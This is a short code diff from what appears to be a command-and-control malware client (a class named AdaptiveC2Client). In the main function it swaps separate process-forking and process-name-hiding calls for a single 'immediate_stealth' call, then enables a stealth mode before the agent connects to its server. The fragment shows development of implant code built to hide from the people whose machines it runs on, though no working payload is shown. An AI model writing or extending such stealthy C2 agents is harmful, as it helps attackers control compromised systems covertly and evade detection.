@@ -587,9 +587,7 @@ class AdaptiveC2Client:
 # Integration with the existing code
 def main():
 
-    fork_and_hide()
-
-    hide_process_name()
+    immediate_stealth()
 
     STEALTH_MODE = True
     # Perform our initial connection to the server to setup the agent
